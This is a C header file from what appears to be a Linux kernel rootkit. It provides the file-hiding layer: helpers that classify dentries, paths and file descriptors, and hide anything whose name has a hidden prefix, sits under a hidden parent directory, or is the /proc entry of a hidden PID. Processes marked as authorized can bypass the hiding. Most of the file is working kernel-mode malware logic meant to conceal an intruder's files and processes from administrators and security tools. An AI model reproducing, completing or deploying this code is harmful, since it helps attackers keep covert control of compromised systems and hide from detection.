#ifndef _ROOTKIT_FILES_H_
#define _ROOTKIT_FILES_H_

#include "constants.h"
#include "macro_utils.h"
#include "utils.h"
#include <linux/dcache.h>
#include <linux/fcntl.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/magic.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/types.h>
// dirent.h lacks some includes, so we include it last
#include <linux/dirent.h>

/**
 * Structure representing a directory entry (legacy; deprecated and removed from the kernel).
 * @note This is used to parse the output of the `getdents` syscall.
 */
typedef struct linux_dirent {
    unsigned long d_ino;     // Inode number
    unsigned long d_off;     // Offset to next linux_dirent
    unsigned short d_reclen; // Length of this linux_dirent
    char d_name[];           // Filename (null-terminated)
} dirent_t;

typedef struct linux_dirent64 dirent64_t;

/**
 * Is the given path structure the root of a filesystem?
 *
 * @param p_path The path structure
 * @return `true` if the given path structure is the root of a filesystem, `false` otherwise
 */
static inline bool is_path_root(const path_t *const p_path)
{
    IF_U (p_path == NULL) {
        return false;
    }

    return IS_ROOT(p_path->dentry);
}

/**
 * Is the given file structure the root of a filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is the root of a filesystem, `false` otherwise
 */
static inline bool is_file_root(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return is_path_root(&p_file->f_path);
}

/**
 * Is the given dentry structure in a `proc` filesystem?
 *
 * @param p_dentry The dentry structure
 * @return `true` if the given dentry structure is in a proc filesystem, `false` otherwise
 */
static inline bool is_dentry_in_proc(const dentry_t *const p_dentry)
{
    IF_U (p_dentry == NULL || p_dentry->d_inode == NULL || p_dentry->d_inode->i_sb == NULL) {
        return false;
    }

    return p_dentry->d_inode->i_sb->s_magic == PROC_SUPER_MAGIC;
}

/**
 * Is the given path structure in a `proc` filesystem?
 *
 * @param p_path The path structure
 * @return `true` if the given path structure is in a proc filesystem, `false` otherwise
 */
static inline bool is_path_in_proc(const path_t *const p_path)
{
    IF_U (p_path == NULL) {
        return false;
    }

    return is_dentry_in_proc(p_path->dentry);
}

/**
 * Is the given file structure in a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is in a proc filesystem, `false` otherwise
 */
static inline bool is_file_in_proc(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return is_path_in_proc(&p_file->f_path);
}

/**
 * Is the given dentry structure the root of a `proc` filesystem?
 *
 * @param p_dentry The dentry structure
 * @return `true` if the given dentry structure is the root of a proc filesystem, `false` otherwise
 */
static inline bool is_dentry_proc_root(const dentry_t *const p_dentry)
{
    IF_U (p_dentry == NULL) {
        return false;
    }

    return IS_ROOT(p_dentry) && is_dentry_in_proc(p_dentry);
}

/**
 * Is the given path structure the root of a `proc` filesystem?
 *
 * @param p_path The path structure
 * @return `true` if the given path structure is the root of a proc filesystem, `false` otherwise
 */
static inline bool is_path_proc_root(const path_t *const p_path)
{
    IF_U (p_path == NULL) {
        return false;
    }

    return is_dentry_proc_root(p_path->dentry);
}

/**
 * Is the given file structure the root of a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is the root of a proc filesystem, `false` otherwise
 */
static inline bool is_file_proc_root(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return is_path_proc_root(&p_file->f_path);
}

/**
 * Is the parent of the given dentry structure the root of a `proc` filesystem?
 *
 * @param p_dentry The dentry structure
 * @return `true` if the parent of the given dentry structure is the root of a proc filesystem,
 *         `false` otherwise
 */
static inline bool is_dentry_parent_proc_root(const dentry_t *const p_dentry)
{
    IF_U (p_dentry == NULL) {
        return false;
    }

    return IS_ROOT(p_dentry->d_parent) && is_dentry_in_proc(p_dentry);
}

/**
 * Is the parent of the given path structure the root of a `proc` filesystem?
 *
 * @param p_path The path structure
 * @return `true` if the parent of the given path structure is the root of a proc filesystem,
 *         `false` otherwise
 */
static inline bool is_path_parent_proc_root(const path_t *const p_path)
{
    IF_U (p_path == NULL) {
        return false;
    }

    return is_dentry_parent_proc_root(p_path->dentry);
}

/**
 * Is the parent of the given file structure the root of a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the parent of the given file structure is the root of a proc filesystem,
 *         `false` otherwise
 */
static inline bool is_file_parent_proc_root(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return is_path_parent_proc_root(&p_file->f_path);
}

/**
 * Is the given dentry structure a strict descendant of the root of a `proc` filesystem?
 *
 * @param p_dentry The dentry structure
 * @return `true` if the given dentry structure is a strict descendant of the root of a proc
 *         filesystem, `false` otherwise
 */
static inline bool is_dentry_proc_descendant(const dentry_t *const p_dentry)
{
    IF_U (p_dentry == NULL) {
        return false;
    }

    return !IS_ROOT(p_dentry) && is_dentry_in_proc(p_dentry);
}

/**
 * Is the given path structure a strict descendant of the root of a `proc` filesystem?
 *
 * @param p_path The path structure
 * @return `true` if the given path structure is a strict descendant of the root of a proc
 *         filesystem, `false` otherwise
 */
static inline bool is_path_proc_descendant(const path_t *const p_path)
{
    IF_U (p_path == NULL) {
        return false;
    }

    return is_dentry_proc_descendant(p_path->dentry);
}

/**
 * Is the given file structure a strict descendant of the root of a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is a strict descendant of the root of a proc
 *         filesystem, `false` otherwise
 */
static inline bool is_file_proc_descendant(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return is_path_proc_descendant(&p_file->f_path);
}

/**
 * Is the given dentry structure a process file/dir?
 *
 * @param p_dentry The dentry structure
 * @param ps_name  (Optional) This gets set to the name of the first directory
 *                 in the dentry after its root
 * @param p_pid    This gets set to the corresponding PID, if the given dentry structure is a process
 * @return `true` if the given dentry structure is a process file/dir, `false` otherwise
 */
bool is_process_dentry(const dentry_t *const p_dentry, const char **const ps_name, pid_t *p_pid);

/**
 * Is the given path structure a process file/dir?
 *
 * @param p_path   The path structure
 * @param ps_name  (Optional) This gets set to the name of the first directory
 *                 in the path after its root
 * @param p_pid    This gets set to the corresponding PID, if the given path structure is a process
 * @return `true` if the given path structure is a process file/dir, `false` otherwise
 */
static inline bool is_process_path(const path_t *const p_path, const char **const ps_name,
                                   pid_t *p_pid)
{
    IF_U (p_path == NULL) {
        if (ps_name != NULL) {
            *ps_name = NULL;
        }
        if (p_pid != NULL) {
            *p_pid = -1;
        }
        return false;
    }

    return is_process_dentry(p_path->dentry, ps_name, p_pid);
}

/**
 * Is the given file structure a process file?
 *
 * @param p_file   The file structure
 * @param ps_name  (Optional) This gets set to the name of the first directory
 *                 in the path after its root
 * @param p_pid    This gets set to the corresponding PID, if the given file structure is a process
 * @return `true` if the given file structure is a process file, `false` otherwise
 */
static inline bool is_process_file(const file_t *const p_file, const char **const ps_name,
                                   pid_t *p_pid)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return is_process_path(&p_file->f_path, ps_name, p_pid);
}

/**
 * Does the given file name need to be hidden?
 * @note Checks if the file name starts with the hidden prefix,
 *       or if it is a hidden PID folder in /proc/.
 *
 * @param s_filename      The file name to check
 * @param b_is_proc_child Is the file a child of /proc/?
 * @param b_check_auth    Should we check if the process is authorized?
 * @return `true` if the given file needs to be hidden, `false` otherwise
 */
static inline bool is_filename_or_pid_hidden(const char *const s_filename,
                                             const bool b_is_proc_child, const bool b_check_auth)
{
    pid_t i32_pid = 0; // PID as an integer

    IF_U (b_check_auth && is_process_authorized(PID_SELF)) {
        pr_dev_info("  * Process is authorized, bypassing checks...\n");
        return false;
    }

    // Check the name starts with the hidden prefix
    IF_U (is_filename_hidden(s_filename)) {
        pr_dev_info("  * This file name starts with the hidden prefix\n");
        return true;
    }

    // If the file is a child of /proc/, first check if its name is a number
    // If it is, check if the corresponding PID is hidden
    IF_U (b_is_proc_child) {
        // Convert the name to a number
        IF_U (kstrtoint(s_filename, 10, &i32_pid)) {
            // If the name is not a number, this is not a PID, so we can return false
            return false;
        }

        // Check if the PID is hidden
        IF_U (is_pid_hidden(i32_pid)) {
            return true;
        }
    }

    return false;
}

/**
 * Is one of the parent directories of the given dentry structure hidden?
 * @note Does not check if the final component of the path is hidden.
 *
 * @param p_dentry The dentry structure to check
 * @return `true` if one of the parent directories of the given dentry structure is hidden,
 *         `false` otherwise
 */
static inline bool is_dentry_hierarchy_hidden(const dentry_t *const p_dentry)
{
    const dentry_t *p_parent = NULL; // dentry structure for parent directories

    IF_U (p_dentry == NULL) {
        return false;
    }

    p_parent = p_dentry->d_parent;
    while (!IS_ROOT(p_parent)) {
        if (is_filename_hidden(p_parent->d_name.name)) {
            pr_dev_info("  * Parent directory is hidden: %s\n", p_parent->d_name.name);
            return true;
        }

        p_parent = p_parent->d_parent;
    }

    return false;
}

/**
 * Is one of the parent directories of the given path structure hidden?
 * @note Does not check if the final component of the path is hidden.
 *
 * @param p_path The path structure to check
 * @return `true` if one of the parent directories of the given path structure is hidden,
 *         `false` otherwise
 */
static inline bool is_path_hierarchy_hidden(const path_t *const p_path)
{
    IF_U (p_path == NULL) {
        return false;
    }

    return is_dentry_hierarchy_hidden(p_path->dentry);
}

/**
 * Does the given dentry need to be hidden?
 * @note Checks if the dentry is a process file/dir and needs to be hidden,
 *       or if the file name starts with the hidden prefix.
 *
 * @param p_dentry     The dentry structure to check
 * @param b_check_auth Should we check if the process is authorized?
 * @return `true` if the given dentry needs to be hidden, `false` otherwise
 */
bool is_dentry_hidden(const dentry_t *const p_dentry, const bool b_check_auth);

/**
 * Does the given path need to be hidden?
 * @note Checks if the path is a process file/dir and needs to be hidden,
 *       or if the file name starts with the hidden prefix.
 *
 * @param p_path       The path structure to check
 * @param b_check_auth Should we check if the process is authorized?
 * @return `true` if the given path needs to be hidden, `false` otherwise
 */
static inline bool is_path_hidden(const path_t *const p_path, const bool b_check_auth)
{
    IF_U (p_path == NULL) {
        return false;
    }

    return is_dentry_hidden(p_path->dentry, b_check_auth);
}

/**
 * Does the given file need to be hidden?
 * @note Checks if the file is a process file and needs to be hidden,
 *       or if the file name starts with the hidden prefix.
 *
 * @param p_file The file structure to check
 * @return `true` if the given file needs to be hidden, `false` otherwise
 */
static inline bool is_file_hidden(const file_t *const p_file, const bool b_check_auth)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return is_path_hidden(&p_file->f_path, b_check_auth);
}

/**
 * Does the given pathname need to be hidden?
 * @note Checks if the pathname is a process file/dir and needs to be hidden,
 *       or if the file name starts with the hidden prefix.
 * @note Also checks if the process is authorized.
 * @note Path is checked twice: first with `AT_SYMLINK_NOFOLLOW`, then with `AT_SYMLINK_FOLLOW`.
 *
 * @param i32_dfd          The file descriptor of the directory containing the pathname, or `AT_FDCWD`
 * @param s_pathname       The pathname to check
 * @param i32_lookup_flags Flags to use when resolving the pathname (`LOOKUP_*` flags, not `AT_*` or `O_*`)
 * @return `true` if the given pathname needs to be hidden, `false` otherwise
 */
bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
                        unsigned int i32_lookup_flags);

/**
 * Gets the file structure associated with the given file descriptor.
 *
 * @param i32_fd The file descriptor
 * @return The file structure associated with the given file descriptor
 */
const file_t *fd_get_file(const int i32_fd);

/**
 * Gets the pathname of the given path struct.
 * @note The returned string must be freed with `kfree`/`kvfree`.
 *
 * @param p_path The path struct
 * @return The pathname of the given path struct
 */
const char *path_get_pathname(const path_t *const p_path);

/**
 * Gets the pathname of the given file struct.
 * @note The returned string must be freed with `kfree`/`kvfree`.
 *
 * @param p_file The file struct
 * @return The pathname of the given file struct
 */
static inline const char *file_get_pathname(const file_t *const p_file)
{
    const path_t *p_path = NULL; // Path structure

    IF_U (p_file == NULL) {
        return ERR_PTR(-EINVAL);
    }

    p_path = &p_file->f_path;

    return path_get_pathname(p_path);
}

/**
 * Gets the pathname of the file associated with the given file descriptor.
 * @note The returned string must be freed with `kfree`/`kvfree`.
 *
 * @param i32_fd The file descriptor
 * @return The pathname of the file associated with the given file descriptor
 */
static inline const char *fd_get_pathname(const int i32_fd)
{
    const file_t *p_file = NULL; // File structure

    p_file = fd_get_file(i32_fd);
    IF_U (IS_ERR(p_file)) {
        return (char *)p_file;
    }

    return file_get_pathname(p_file);
}

#endif
